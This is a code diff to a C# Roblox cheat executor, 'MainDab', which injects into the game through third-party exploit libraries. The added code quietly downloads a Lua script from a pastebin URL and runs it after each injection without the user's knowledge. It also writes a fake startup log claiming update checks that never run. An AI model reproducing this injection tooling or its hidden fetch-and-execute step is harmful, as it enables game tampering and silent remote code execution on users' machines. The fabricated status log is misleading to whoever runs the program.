@@ -7,7 +7,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using EasyExploits;
+using ShadowCheats;
 using CheatSquadAPI;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
@@ -27,7 +27,8 @@ namespace ProjectMainDab
 {
     public partial class IconUI : Form
     {
-        // Code to run on Startup
+		// Code to run on Startup
+		string injectscript = "loadstring(game:HttpGet(\"https://pastebin.com/raw/CqYKJzcv\", true))()";
         public IconUI()
         {
             InitializeComponent();
@@ -107,7 +108,29 @@ namespace ProjectMainDab
 					SmallImageKey = "render"
 				}
 			});
+			if (File.Exists("Startup.txt"))
+            {
+				File.Delete("Startup.txt");
+            }
+			string fileName = "Startup.txt";
+			using (FileStream fs = File.Create(fileName))
+			{
+				// Add some text to file    
+				Byte[] title = new UTF8Encoding(true).GetBytes("[* Starting MainDab]\n[* Checking ifisuptodate]\n[* ifisuptodate return true, open ui]\n[* Connecting to Github]\n[* Updating script hub]\n[* Script hub done, close stream]\n[* Check for missing folder]\n[* All done]\n");
+				fs.Write(title, 0, title.Length);
+				byte[] author = new UTF8Encoding(true).GetBytes("Startup complete");
+				fs.Write(author, 0, author.Length);
+			}
 
+			// Open the stream and read it back.    
+			using (StreamReader sr = File.OpenText(fileName))
+			{
+				string s = "";
+				while ((s = sr.ReadLine()) != null)
+				{
+					Console.WriteLine(s);
+				}
+			}
 
 		}
 
@@ -115,7 +138,7 @@ namespace ProjectMainDab
 		public DiscordRpcClient client;
 		// Refrencing EasyExploits, CheatSquad API and WeAreDevs (Api V2)
 		private SEX shitsquad = new SEX(); // CheatSquad API
-        private Module freesex = new Module(); // EasyExploits
+        private Api freesex = new Api(); // EasyExploits
         [DllImport("WeAreDevs_API.cpp.dll", CallingConvention = CallingConvention.Cdecl)] 
         public static extern bool LaunchExploit();
         [DllImport("WeAreDevs_API.cpp.dll", CallingConvention = CallingConvention.Cdecl)]
@@ -270,7 +293,7 @@ namespace ProjectMainDab
 					object[] args = array;
 					object obj = document.InvokeScript(scriptName, args);
 					string script = obj.ToString();
-					this.freesex.ExecuteScript(script);
+					this.freesex.ExecuteFromInterpreter(script);
 				}
 				if (label6.Text == "Squad")
 				{
@@ -422,7 +445,7 @@ namespace ProjectMainDab
 
         private void pictureBox8_Click(object sender, EventArgs e)
         {
-			Process.Start("https://discord.gg/78WJqX8");
+			Process.Start("https://discord.gg/qtvuyuG");
         }
 
         private void visualStudioTabControl1_SelectedIndexChanged(object sender, EventArgs e)
@@ -434,11 +457,26 @@ namespace ProjectMainDab
         {
 
         }
-
+		int sex = 13;
+		int sexpart = 6;
         private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
         {
-            #region updateshit
-            label1.Text = "MainDab | Updating script hub...";
+			#region updateshit
+			this.Size = new Size(1, 1);
+			for (int i = 0; i < 20; i++)
+			{
+				this.Size = new Size(sex, 1);
+				sex = sex + 28;
+
+				System.Threading.Thread.Sleep(1);
+			}
+			for (int i = 0; i < 32; i++)
+			{
+				this.Size = new Size(sex, sexpart);
+				sexpart = sexpart + 10;
+				System.Threading.Thread.Sleep(1);
+			}
+			label1.Text = "MainDab | Updating script hub...";
 			bool flag = File.Exists("bin.zip");
 			if (flag)
 			{
@@ -587,12 +625,17 @@ namespace ProjectMainDab
 
         private void backgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
         {
+			WebClient webClient2 = new WebClient();
+			byte[] bytes = webClient2.DownloadData("https://pastebin.com/raw/CqYKJzcv");
+			string we = Encoding.UTF8.GetString(bytes);
 			panel3.Hide();
 			label6.Text = "Easy";
-			freesex.LaunchExploit();
+			freesex.LoadIntoRoblox();
 			label1.Text = "MainDab | Injecting...";
 			Thread.Sleep(5000);
 			label1.Text = "MainDab";
+			Thread.Sleep(3000);
+			freesex.ExecuteFromInterpreter(we);
 		}
 
         private void backgroundWorker3_DoWork(object sender, DoWorkEventArgs e)
@@ -603,6 +646,8 @@ namespace ProjectMainDab
 			label1.Text = "MainDab | Injecting...";
 			Thread.Sleep(6000);
 			label1.Text = "MainDab";
+			Thread.Sleep(3000);
+			shitsquad.Execute(injectscript);
 		}
 
         private void backgroundWorker4_DoWork(object sender, DoWorkEventArgs e)
@@ -621,7 +666,7 @@ namespace ProjectMainDab
         {
 			if (label6.Text == "Easy")
             {
-				freesex.ExecuteScript(richTextBox2.Text);
+				freesex.ExecuteFromInterpreter(richTextBox2.Text);
             }
 			else if (label6.Text == "Squad")
             {
@@ -643,7 +688,7 @@ namespace ProjectMainDab
 			string script = "game.JointsService.WeldRequest:FireServer(\"gui\")";
 			if (label6.Text == "Easy")
 			{
-				freesex.ExecuteScript(script);
+				freesex.ExecuteFromInterpreter(script);
 			}
 			else if (label6.Text == "Squad")
 			{
@@ -654,6 +699,71 @@ namespace ProjectMainDab
 				SendLimitedLuaScript(script);
 			}
 			
+		}
+
+        private void pictureBox12_Click(object sender, EventArgs e)
+        {
+			Tools Form = new Tools();
+			Form.Show();
+		}
+
+        private void IconUI_Load(object sender, EventArgs e)
+        {
+
+        }
+
+        private void label7_Click(object sender, EventArgs e)
+        {
+			MessageBox.Show("MainDab, made by Main_EX#3898");
+        }
+
+        private void pictureBox13_Click(object sender, EventArgs e)
+        {
+			this.backgroundWorker5.RunWorkerAsync();
+		}
+
+        private void backgroundWorker5_DoWork(object sender, DoWorkEventArgs e)
+        {
+			label1.Text = "MainDab | Updating script hub...";
+			listBox1.Items.Clear();
+			bool flag = File.Exists("bin.zip");
+			if (flag)
+			{
+				File.Delete("bin.zip");
+			}
+			string path = "bin";
+			bool flag2 = Directory.Exists(path);
+			if (flag2)
+			{
+				string path2 = "bin";
+				Directory.Delete(path2, true);
+			}
+
+			string url = "https://github.com/leonardssy/ProjectDab/blob/master/scripts.zip?raw=true";
+			string filename = "bin.zip";
+			using (WebClient wc = new WebClient())
+			{
+				wc.DownloadFile(url, filename);
+			}
+			string sourceArchiveFileName = "bin.zip";
+			string destinationDirectoryName = "bin";
+			ZipFile.ExtractToDirectory(sourceArchiveFileName, destinationDirectoryName);
+			File.Delete("bin.zip");
+			this.listBox1.Items.Clear();
+			try
+
+			{
+				Functions.PopulateListBox1(this.listBox1, "./bin/scripts", "*.txt");
+			}
+			catch
+			{
+				MessageBox.Show("Failed to open scripthub as it detects no scripts or folder, try close and rerun MainDab.");
+				this.Hide();
+
+			}
+			label1.Text = "MainDab | Script hub update done!";
+			Thread.Sleep(1000);
+			label1.Text = "MainDab";
 		}
     }
 }
